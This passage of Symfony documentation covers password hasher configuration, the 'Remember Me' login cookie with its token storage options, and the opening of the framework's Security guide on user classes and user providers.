                    cost="15"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->passwordHasher('harsh')
                ->algorithm('auto')
                ->cost(15)
            ;
        };

    .. code-block:: php-standalone

        use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;

        $passwordHasherFactory = new PasswordHasherFactory([
            // ...
            'harsh' => [
                'algorithm' => 'auto',
                'cost' => 15
            ],
        ]);

This creates a hasher named ``harsh``. In order for a ``User`` instance
to use it, the class must implement
:class:`Symfony\\Component\\PasswordHasher\\Hasher\\PasswordHasherAwareInterface`.
The interface requires one method - ``getPasswordHasherName()`` - which should return
the name of the hasher to use::

    // src/Entity/User.php
    namespace App\Entity;

    use Symfony\Component\PasswordHasher\Hasher\PasswordHasherAwareInterface;
    use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
    use Symfony\Component\Security\Core\User\UserInterface;

    class User implements
        UserInterface,
        PasswordAuthenticatedUserInterface,
        PasswordHasherAwareInterface
    {
        // ...

        public function getPasswordHasherName(): ?string
        {
            if ($this->isAdmin()) {
                return 'harsh';
            }

            return null; // use the default hasher
        }
    }

.. caution::

    When :ref:`migrating passwords <security-password-migration>`, you don't
    need to implement ``PasswordHasherAwareInterface`` to return the legacy
    hasher name: Symfony will detect it from your ``migrate_from`` configuration.

If you created your own password hasher implementing the
:class:`Symfony\\Component\\PasswordHasher\\PasswordHasherInterface`,
you must register a service for it in order to use it as a named hasher:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            password_hashers:
                app_hasher:
                    id: 'App\Security\Hasher\MyCustomPasswordHasher'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd"
        >

            <config>
                <!-- ... -->
                <security:password_hasher class="app_hasher"
                    id="App\Security\Hasher\MyCustomPasswordHasher"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\Hasher\MyCustomPasswordHasher;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->passwordHasher('app_hasher')
                ->id(MyCustomPasswordHasher::class)
            ;
        };

This creates a hasher named ``app_hasher`` from a service with the ID
``App\Security\Hasher\MyCustomPasswordHasher``.

Hashing a Stand-Alone String
----------------------------

The password hasher can be used to hash strings independently
of users. By using the
:class:`Symfony\\Component\\PasswordHasher\\Hasher\\PasswordHasherFactory`,
you can declare multiple hashers, retrieve any of them with
its name and create hashes. You can then verify that a string matches the given
hash::

    use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;

    // configure different hashers via the factory
    $factory = new PasswordHasherFactory([
        'common' => ['algorithm' => 'bcrypt'],
        'sodium' => ['algorithm' => 'sodium'],
    ]);

    // retrieve the hasher using bcrypt
    $hasher = $factory->getPasswordHasher('common');
    $hash = $hasher->hash('plain');

    // verify that a given string matches the hash calculated above
    $hasher->verify($hash, 'invalid'); // false
    $hasher->verify($hash, 'plain'); // true

.. _passwordhasher-supported-algorithms:

Supported Algorithms
--------------------

* :ref:`auto <reference-security-encoder-auto>`
* :ref:`bcrypt <reference-security-encoder-bcrypt>`
* :ref:`sodium <reference-security-sodium>`
* :ref:`PBKDF2 <reference-security-pbkdf2>`

* :ref:`Or create a custom password hasher <custom-password-hasher>`

.. TODO missing:
..  * :ref:`Message Digest <reference-security-message-digest>`
..  * :ref:`Native <reference-security-native>`
..  * :ref:`Plaintext <reference-security-plaintext>`

.. _reference-security-encoder-auto:

The "auto"  Hasher
~~~~~~~~~~~~~~~~~~

It automatically selects the best available hasher (currently Bcrypt). If
PHP or Symfony adds new password hashers in the future, it might select a
different hasher.

Because of this, the length of the hashed passwords may change in the future, so
make sure to allocate enough space for them to be persisted (``varchar(255)``
should be a good setting).

.. _reference-security-encoder-bcrypt:

The Bcrypt Password Hasher
~~~~~~~~~~~~~~~~~~~~~~~~~~

It produces hashed passwords with the `bcrypt password hashing function`_.
Hashed passwords are ``60`` characters long, so make sure to
allocate enough space for them to be persisted. Also, passwords include the
`cryptographic salt`_ inside them (it's generated automatically for each new
password) so you don't have to deal with it.

Its only configuration option is ``cost``, which is an integer in the range of
``4-31`` (by default, ``13``). Each single increment of the cost **doubles the
time** it takes to hash a password. It's designed this way so the password
strength can be adapted to the future improvements in computation power.

You can change the cost at any time — even if you already have some passwords
hashed using a different cost. New passwords will be hashed using the new
cost, while the already hashed ones will be validated using a cost that was
used back when they were hashed.

.. tip::

    A simple technique to make tests much faster when using BCrypt is to set
    the cost to ``4``, which is the minimum value allowed, in the ``test``
    environment configuration.

.. _reference-security-sodium:

The Sodium Password Hasher
~~~~~~~~~~~~~~~~~~~~~~~~~~

It uses the `Argon2 key derivation function`_. Argon2 support was introduced
in PHP 7.2 by bundling the `libsodium`_ extension.

The hashed passwords are ``96`` characters long, but due to the hashing
requirements saved in the resulting hash this may change in the future, so make
sure to allocate enough space for them to be persisted. Also, passwords include
the `cryptographic salt`_ inside them (it's generated automatically for each new
password) so you don't have to deal with it.

.. _reference-security-pbkdf2:

The PBKDF2 Hasher
~~~~~~~~~~~~~~~~~

Using the `PBKDF2`_ hasher is no longer recommended since PHP added support for
Sodium and BCrypt. Legacy application still using it are encouraged to upgrade
to those newer hashing algorithms.

.. _custom-password-hasher:

Creating a custom Password Hasher
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to create your own, it needs to follow these rules:

#. The class must implement :class:`Symfony\\Component\\PasswordHasher\\PasswordHasherInterface`
   (you can also implement :class:`Symfony\\Component\\PasswordHasher\\LegacyPasswordHasherInterface` if your hash algorithm uses a separate salt);

#. The implementations of
   :method:`Symfony\\Component\\PasswordHasher\\PasswordHasherInterface::hash`
   and :method:`Symfony\\Component\\PasswordHasher\\PasswordHasherInterface::verify`
   **must validate that the password length is no longer than 4096
   characters.** This is for security reasons (see `CVE-2013-5750`_).

   You can use the :method:`Symfony\\Component\\PasswordHasher\\Hasher\\CheckPasswordLengthTrait::isPasswordTooLong`
   method for this check.

.. code-block:: php

    // src/Security/Hasher/CustomVerySecureHasher.php
    namespace App\Security\Hasher;

    use Symfony\Component\PasswordHasher\Exception\InvalidPasswordException;
    use Symfony\Component\PasswordHasher\Hasher\CheckPasswordLengthTrait;
    use Symfony\Component\PasswordHasher\PasswordHasherInterface;

    class CustomVerySecureHasher implements PasswordHasherInterface
    {
        use CheckPasswordLengthTrait;

        public function hash(string $plainPassword): string
        {
            if ($this->isPasswordTooLong($plainPassword)) {
                throw new InvalidPasswordException();
            }

            // ... hash the plain password in a secure way

            return $hashedPassword;
        }

        public function verify(string $hashedPassword, string $plainPassword): bool
        {
            if ('' === $plainPassword || $this->isPasswordTooLong($plainPassword)) {
                return false;
            }

            // ... validate if the password equals the user's password in a secure way

            return $passwordIsValid;
        }

        public function needsRehash(string $hashedPassword): bool
        {
            // Check if a password hash would benefit from rehashing
            return $needsRehash;
        }
    }

Now, define a password hasher using the ``id`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            password_hashers:
                app_hasher:
                    # the service ID of your custom hasher (the FQCN using the default services.yaml)
                    id: 'App\Security\Hasher\MyCustomPasswordHasher'

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd"
        >

            <config>
                <!-- ... -->
                <!-- id: the service ID of your custom hasher (the FQCN using the default services.yaml) -->
                <security:password_hasher class="app_hasher"
                    id="App\Security\Hasher\CustomVerySecureHasher"/>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\Hasher\CustomVerySecureHasher;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->passwordHasher('app_hasher')
                // the service ID of your custom hasher (the FQCN using the default services.yaml)
                ->id(CustomVerySecureHasher::class)
            ;
        };

.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
.. _`PBKDF2`: https://en.wikipedia.org/wiki/PBKDF2
.. _`libsodium`: https://pecl.php.net/package/libsodium
.. _`Argon2 key derivation function`: https://en.wikipedia.org/wiki/Argon2
.. _`bcrypt password hashing function`: https://en.wikipedia.org/wiki/Bcrypt
.. _`cryptographic salt`: https://en.wikipedia.org/wiki/Salt_(cryptography)
.. _`the Doctrine docs for information`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/working-with-objects.html#custom-repositories
.. _`SymfonyCastsResetPasswordBundle`: https://github.com/symfonycasts/reset-password-bundle
.. _`CVE-2013-5750`: https://symfony.com/blog/cve-2013-5750-security-issue-in-fosuserbundle-login-form
How to Add "Remember Me" Login Functionality
============================================

Once a user is authenticated, their credentials are typically stored in the
session. This means that when the session ends they will be logged out and
have to provide their login details again next time they wish to access the
application. You can allow users to choose to stay logged in for longer than
the session lasts using a cookie with the ``remember_me`` firewall option:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    remember_me:
                        secret:   '%kernel.secret%' # required
                        lifetime: 604800 # 1 week in seconds
                        # by default, the feature is enabled by checking a
                        # checkbox in the login form (see below), uncomment the
                        # following line to always enable it.
                        #always_remember_me: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->

                    <!-- secret: required
                         lifetime: 604800 is 1 week in seconds -->
                    <remember-me
                        secret="%kernel.secret%"
                        lifetime="604800"
                    />
                    <!-- by default, the feature is enabled by checking a checkbox
                         in the login form (see below), add always-remember-me="true"
                         to always enable it. -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->rememberMe()
                    ->secret('%kernel.secret%') // required
                    ->lifetime(604800) // 1 week in seconds

                    // by default, the feature is enabled by checking a
                    // checkbox in the login form (see below), uncomment
                    // the following line to always enable it.
                    // ->alwaysRememberMe(true)
            ;
        };

The ``secret`` option is the only required option and it is used to sign
the remember me cookie. It's common to use the ``kernel.secret`` parameter,
which is defined using the ``APP_SECRET`` environment variable.

After enabling the ``remember_me`` system in the configuration, there are a
couple more things to do before remember me works correctly:

#. :ref:`Add an opt-in checkbox to activate remember me <security-remember-me-activate>`;
#. :ref:`Use an authenticator that supports remember me <security-remember-me-authenticator>`;
#. Optionally, :ref:`configure how remember me cookies are stored and validated <security-remember-me-storage>`.

After this, the remember me cookie will be created upon successful
authentication. For some pages/actions, you can
:ref:`force a user to fully authenticate <security-remember-me-authorization>`
(i.e. not through a remember me cookie) for better security.

.. note::

    The ``remember_me`` setting contains many settings to configure the
    cookie created by this feature. See `Customizing the Remember Me Cookie`_
    for a full description of these settings.

.. _security-remember-me-activate:

Activating the Remember Me System
---------------------------------

Using the remember me cookie is not always appropriate (e.g. you should not
use it on a shared PC). This is why by default, Symfony requires your users
to opt-in to the remember me system via a request parameter.

Remember Me for Form Login
~~~~~~~~~~~~~~~~~~~~~~~~~~

This request parameter is often set via a checkbox in the login form. This
checkbox must have a name of ``_remember_me``:

.. code-block:: html+twig

    {# templates/security/login.html.twig #}
    <form method="post">
        {# ... your form fields #}

        <label>
            <input type="checkbox" name="_remember_me" checked>
            Keep me logged in
        </label>

        {# ... #}
    </form>

.. note::

    Optionally, you can configure a custom name for this checkbox using the
    ``name`` setting under the ``remember_me`` section.

Remember Me for JSON Login
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you implement the login via an API that uses :ref:`JSON Login <json-login>`
you can add a ``_remember_me`` key to the body of your POST request.

.. code-block:: json

    {
        "username": "dunglas@example.com",
        "password": "MyPassword",
        "_remember_me": true
    }

.. note::

    Optionally, you can configure a custom name for this key using the
    ``name`` setting under the ``remember_me`` section of your firewall.

Always activating Remember Me
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes, you may wish to always activate the remember me system and not
allow users to opt-out. In these cases, you can use the
``always_remember_me`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    remember_me:
                        secret: '%kernel.secret%'
                        # ...
                        always_remember_me: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->

                    <remember-me
                        secret="%kernel.secret%"
                        always-remember-me="true"
                    />
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->rememberMe()
                    ->secret('%kernel.secret%')
                    // ...
                    ->alwaysRememberMe(true)
            ;
        };

Now, no request parameter is checked and each successful authentication
will produce a remember me cookie.

.. _security-remember-me-authenticator:

Add Remember Me Support to the Authenticator
--------------------------------------------

Not all authentication methods support remember me (e.g. HTTP Basic
authentication doesn't have support). An authenticator indicates support
using a ``RememberMeBadge`` on the :ref:`security passport <security-passport>`.

After logging in, you can use the security profiler to see if this badge is
present:

.. image:: /_images/security/profiler-badges.png
    :alt: The Security page of the Symfony profiler, with the "Authenticators" tab showing the remember me badge in the passport object.

Without this badge, remember me will not be activated (regardless of all
other settings).

Add Remember Me Support to Custom Authenticators
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When you use a custom authenticator, you must add a ``RememberMeBadge``
manually::

    // src/Service/LoginAuthenticator.php
    namespace App\Service;

    // ...
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\RememberMeBadge;
    use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
    use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

    class LoginAuthenticator extends AbstractAuthenticator
    {
        public function authenticate(Request $request): Passport
        {
            // ...

            return new Passport(
                new UserBadge(...),
                new PasswordCredentials(...),
                [
                    new RememberMeBadge(),
                ]
            );
        }
    }

.. _security-remember-me-storage:

Customize how Remember Me Tokens are Stored
-------------------------------------------

Remember me cookies contain a token that is used to verify the user's
identity. As these tokens are long-lived, it is important to take
precautions to allow invalidating any generated tokens.

Symfony provides two ways to validate remember me tokens:

Signature based tokens
    By default, the remember me cookie contains a signature based on
    properties of the user. If the properties change, the signature changes
    and already generated tokens are no longer considered valid. See
    :ref:`how to use them <security-remember-me-signature>` for more
    information.

Persistent tokens
    Persistent tokens store any generated token (e.g. in a database). This
    allows you to invalidate tokens by changing the rows in the database.
    See :ref:`how to store tokens <security-remember-me-persistent>` for more
    information.

.. note::

    You can also write your own custom remember me handler by creating a
    class that extends
    :class:`Symfony\\Component\\Security\\Http\\RememberMe\\AbstractRememberMeHandler`
    (or implements :class:`Symfony\\Component\\Security\\Http\\RememberMe\\RememberMeHandlerInterface`).
    You can then configure this custom handler by configuring the service
    ID in the ``service`` option under ``remember_me``.

.. _security-remember-me-signature:

Using Signed Remember Me Tokens
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, remember me cookies contain a *hash* that is used to validate
the cookie. This hash is computed based on configured
signature properties.

These properties are always included in the hash:

* The user identifier (returned by
  :method:`Symfony\\Component\\Security\\Core\\User\\UserInterface::getUserIdentifier`);
* The expiration timestamp.

On top of these, you can configure custom properties using the
``signature_properties`` setting (defaults to ``password``). The properties
are fetched from the user object using the
:doc:`PropertyAccess component </components/property_access>` (e.g. using
``getUpdatedAt()`` or a public ``$updatedAt`` property when using
``updatedAt``).

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    remember_me:
                        secret: '%kernel.secret%'
                        # ...
                        signature_properties: ['password', 'updatedAt']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->

                    <remember-me secret="%kernel.secret%">
                        <signature-property>password</signature-property>
                        <signature-property>updatedAt</signature-property>
                    </remember-me>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->rememberMe()
                    ->secret('%kernel.secret%')
                    // ...
                    ->signatureProperties(['password', 'updatedAt'])
            ;
        };

In this example, the remember me cookie will no longer be considered valid
if the ``updatedAt``, password or user identifier for this user changes.

.. tip::

    Signature properties allow for some advanced usages without having to
    set-up storage for all remember me tokens. For instance, you can add a
    ``forceReloginAt`` field to your user and to the signature properties.
    This way, you can invalidate all remember me tokens from a user by
    changing this timestamp.

.. _security-remember-me-persistent:

Storing Remember Me Tokens in the Database
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

As remember me tokens are often long-lived, you might prefer to save them in
a database to have full control over them. Symfony comes with support for
persistent remember me tokens.

This implementation uses a *remember me token provider* for storing and
retrieving the tokens from the database. The DoctrineBridge provides a
token provider using Doctrine.

You can enable the doctrine token provider using the ``doctrine`` setting:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    remember_me:
                        secret: '%kernel.secret%'
                        # ...
                        token_provider:
                            doctrine: true

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->

                    <remember-me secret="%kernel.secret%">
                        <token-provider doctrine="true"/>
                    </remember-me>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->rememberMe()
                    ->secret('%kernel.secret%')
                    // ...
                    ->tokenProvider([
                        'doctrine' => true,
                    ])
            ;
        };

This also instructs Doctrine to create a table for the remember me tokens.
If you use the DoctrineMigrationsBundle, you can create a new migration for
this:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:diff

    # and optionally run the migrations locally
    $ php bin/console doctrine:migrations:migrate

Otherwise, you can use the ``doctrine:schema:update`` command:

.. code-block:: terminal

    # get the required SQL code
    $ php bin/console doctrine:schema:update --dump-sql

    # run the SQL in your DB client, or let the command run it for you
    $ php bin/console doctrine:schema:update --force

Implementing a Custom Token Provider
....................................

You can also create a custom token provider by creating a class that
implements :class:`Symfony\\Component\\Security\\Core\\Authentication\\RememberMe\\TokenProviderInterface`.

Then, configure the service ID of your custom token provider as ``service``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            firewalls:
                main:
                    # ...
                    remember_me:
                        # ...
                        token_provider:
                            service: App\Security\RememberMe\CustomTokenProvider

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <firewall name="main">
                    <!-- ... -->

                    <remember-me>
                        <token-provider service="App\Security\RememberMe\CustomTokenProvider"/>
                    </remember-me>
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\RememberMe\CustomTokenProvider;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                // ...
                ->rememberMe()
                    // ...
                    ->tokenProvider([
                        'service' => CustomTokenProvider::class,
                    ])
            ;
        };

.. _security-remember-me-authorization:

Forcing the User to Re-Authenticate before Accessing certain Resources
----------------------------------------------------------------------

When the user returns to your site, they are authenticated automatically based
on the information stored in the remember me cookie. This allows the user
to access protected resources as if the user had actually authenticated upon
visiting the site.

In some cases, however, you may want to force the user to actually re-authenticate
before accessing certain resources. For example, you might not allow "remember me"
users to change their password. You can do this by leveraging a few special
"attributes"::

    // src/Controller/AccountController.php
    // ...

    public function accountInfo(): Response
    {
        // allow any authenticated user - we don't care if they just
        // logged in, or are logged in via a remember me cookie
        $this->denyAccessUnlessGranted('IS_AUTHENTICATED_REMEMBERED');

        // ...
    }

    public function resetPassword(): Response
    {
        // require the user to log in during *this* session
        // if they were only logged in via a remember me cookie, they
        // will be redirected to the login page
        $this->denyAccessUnlessGranted('IS_AUTHENTICATED_FULLY');

        // ...
    }

.. tip::

    There is also a ``IS_REMEMBERED`` attribute that grants access *only*
    when the user is authenticated via the remember me mechanism.

Customizing the Remember Me Cookie
----------------------------------

The ``remember_me`` configuration contains many options to customize the
cookie created by the system:

``name`` (default value: ``REMEMBERME``)
    The name of the cookie used to keep the user logged in. If you enable the
    ``remember_me`` feature in several firewalls of the same application, make sure
    to choose a different name for the cookie of each firewall. Otherwise, you'll
    face lots of security related problems.

``lifetime`` (default value: ``31536000`` i.e. 1 year in seconds)
    The number of seconds after which the cookie will be expired. This
    defines the maximum time between two visits for the user to remain
    authenticated.

``path`` (default value: ``/``)
    The path where the cookie associated with this feature is used. By default
    the cookie will be applied to the entire website but you can restrict to a
    specific section (e.g. ``/forum``, ``/admin``).

``domain`` (default value: ``null``)
    The domain where the cookie associated with this feature is used. By default
    cookies use the current domain obtained from ``$_SERVER``.

``secure`` (default value: ``false``)
    If ``true``, the cookie associated with this feature is sent to the user
    through an HTTPS secure connection.

``httponly`` (default value: ``true``)
    If ``true``, the cookie associated with this feature is accessible only
    through the HTTP protocol. This means that the cookie won't be accessible
    by scripting languages, such as JavaScript.

``samesite`` (default value: ``null``)
    If set to ``strict``, the cookie associated with this feature will not
    be sent along with cross-site requests, even when following a regular link.
Security
========

Symfony provides many tools to secure your application. Some HTTP-related
security tools, like :doc:`secure session cookies </session>` and
:doc:`CSRF protection </security/csrf>` are provided by default. The
SecurityBundle, which you will learn about in this guide, provides all
authentication and authorization features needed to secure your
application.

.. _security-installation:

To get started, install the SecurityBundle:

.. code-block:: terminal

    $ composer require symfony/security-bundle

If you have :ref:`Symfony Flex <symfony-flex>` installed, this also
creates a ``security.yaml`` configuration file for you:

.. code-block:: yaml

    # config/packages/security.yaml
    security:
        # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
        password_hashers:
            Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
        # https://symfony.com/doc/current/security.html#where-do-users-come-from-user-providers
        providers:
            users_in_memory: { memory: null }
        firewalls:
            dev:
                pattern: ^/(_(profiler|wdt)|css|images|js)/
                security: false
            main:
                lazy: true
                provider: users_in_memory

                # activate different ways to authenticate
                # https://symfony.com/doc/current/security.html#firewalls-authentication

                # https://symfony.com/doc/current/security/impersonating_user.html
                # switch_user: true

        # Easy way to control access for large sections of your site
        # Note: Only the *first* access control that matches will be used
        access_control:
            # - { path: ^/admin, roles: ROLE_ADMIN }
            # - { path: ^/profile, roles: ROLE_USER }

That's a lot of config! In the next sections, the three main elements are
discussed:

`The User`_ (``providers``)
    Any secured section of your application needs some concept of
    a user. The user provider loads users from any storage (e.g. the
    database) based on a "user identifier" (e.g. the user's email address);

`The Firewall`_ & `Authenticating Users`_ (``firewalls``)
    The firewall is the core of securing your application. Every request
    within the firewall is checked if it needs an authenticated user. The
    firewall also takes care of authenticating this user (e.g. using a
    login form);

`Access Control (Authorization)`_ (``access_control``)
    Using access control and the authorization checker, you control the
    required permissions to perform a specific action or visit a specific
    URL.

.. _create-user-class:
.. _a-create-your-user-class:

The User
--------

Permissions in Symfony are always linked to a user object. If you need to
secure (parts of) your application, you need to create a user class. This
is a class that implements :class:`Symfony\\Component\\Security\\Core\\User\\UserInterface`.
This is often a Doctrine entity, but you can also use a dedicated
Security user class.

The easiest way to generate a user class is using the ``make:user`` command
from the `MakerBundle`_:

.. code-block:: terminal

    $ php bin/console make:user
     The name of the security user class (e.g. User) [User]:
     > User

     Do you want to store user data in the database (via Doctrine)? (yes/no) [yes]:
     > yes

     Enter a property name that will be the unique "display" name for the user (e.g. email, username, uuid) [email]:
     > email

     Will this app need to hash/check user passwords? Choose No if passwords are not needed or will be checked/hashed by some other system (e.g. a single sign-on server).

     Does this app need to hash/check user passwords? (yes/no) [yes]:
     > yes

     created: src/Entity/User.php
     created: src/Repository/UserRepository.php
     updated: src/Entity/User.php
     updated: config/packages/security.yaml

.. code-block:: php

    // src/Entity/User.php
    namespace App\Entity;

    use App\Repository\UserRepository;
    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
    use Symfony\Component\Security\Core\User\UserInterface;

    #[ORM\Entity(repositoryClass: UserRepository::class)]
    class User implements UserInterface, PasswordAuthenticatedUserInterface
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column(type: 'integer')]
        private int $id;

        #[ORM\Column(type: 'string', length: 180, unique: true)]
        private ?string $email;

        #[ORM\Column(type: 'json')]
        private array $roles = [];

        #[ORM\Column(type: 'string')]
        private string $password;

        public function getId(): ?int
        {
            return $this->id;
        }

        public function getEmail(): ?string
        {
            return $this->email;
        }

        public function setEmail(string $email): self
        {
            $this->email = $email;

            return $this;
        }

        /**
         * The public representation of the user (e.g. a username, an email address, etc.)
         *
         * @see UserInterface
         */
        public function getUserIdentifier(): string
        {
            return (string) $this->email;
        }

        /**
         * @see UserInterface
         */
        public function getRoles(): array
        {
            $roles = $this->roles;
            // guarantee every user at least has ROLE_USER
            $roles[] = 'ROLE_USER';

            return array_unique($roles);
        }

        public function setRoles(array $roles): self
        {
            $this->roles = $roles;

            return $this;
        }

        /**
         * @see PasswordAuthenticatedUserInterface
         */
        public function getPassword(): string
        {
            return $this->password;
        }

        public function setPassword(string $password): self
        {
            $this->password = $password;

            return $this;
        }

        /**
         * @see UserInterface
         */
        public function eraseCredentials(): void
        {
            // If you store any temporary, sensitive data on the user, clear it here
            // $this->plainPassword = null;
        }
    }

.. tip::

    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or
    ``--with-ulid`` to ``make:user``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,
    this generates a ``User`` entity with the ``id`` type as :ref:`Uuid <uuid>`
    or :ref:`Ulid <ulid>` instead of ``int``.

If your user is a Doctrine entity, like in the example above, don't forget
to create the tables by :ref:`creating and running a migration <doctrine-creating-the-database-tables-schema>`:

.. code-block:: terminal

    $ php bin/console make:migration
    $ php bin/console doctrine:migrations:migrate

.. tip::

    Starting in `MakerBundle`_: v1.56.0 - Passing ``--formatted`` to ``make:migration``
    generates a nice and tidy migration file.

.. _where-do-users-come-from-user-providers:
.. _security-user-providers:

Loading the User: The User Provider
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Besides creating the entity, the ``make:user`` command also adds config
for a user provider in your security configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...

            providers:
                app_user_provider:
                    entity:
                        class: App\Entity\User
                        property: email

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
